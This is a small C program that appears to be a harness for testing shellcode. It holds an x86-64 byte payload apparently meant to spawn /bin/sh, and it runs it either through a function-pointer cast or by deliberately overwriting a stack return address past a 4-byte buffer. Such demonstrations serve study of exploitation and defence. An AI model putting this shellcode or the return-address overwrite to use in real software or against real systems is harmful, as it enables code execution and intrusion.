#include <stdio.h>
#include <unistd.h>
#include <string.h>

__attribute__((section(".text")))
char payload[] = {
    0x55, 0x48, 0x89, 0xe5, 0x48, 0xc7, 0xc0, 0x2f, 0x73, 0x68, 0x00, 0x48,
    0xc1, 0xe0, 0x10, 0x48, 0xc1, 0xe0, 0x10, 0x48, 0x35, 0x2f, 0x62, 0x69,
    0x6e, 0x50, 0x6a, 0x00, 0x54, 0x48, 0x8d, 0x7d, 0xf8, 0x48, 0x8d, 0x75,
    0xf0, 0x48, 0x8d, 0x55, 0xe8, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05 
};

void bruteforce()
{
	union {
		void (*fun)();
		char *ptr;
	} a;
	a.ptr = payload;
	a.fun();
}

/* 
 * almoast explicitly overwrite the return address with payloads address
 */
void test()
{
	char buf[4];
	((char**)(buf+0x18))[0] = payload;
}

void usage(char const * const prog)
{
	fprintf(stderr, "Usage: %s [0|1]\n", prog);
}

int main(int const argc, char const * const * const argv)
{
	if (argc != 2 || ((strcmp(argv[1], "0") != 0) && (strcmp(argv[1], "1") != 0))) {
		usage(argv[0]);
		return 1;
	}
	if (!strcmp("0", argv[1]))
		bruteforce();
	else
		test();
	return 0;
}

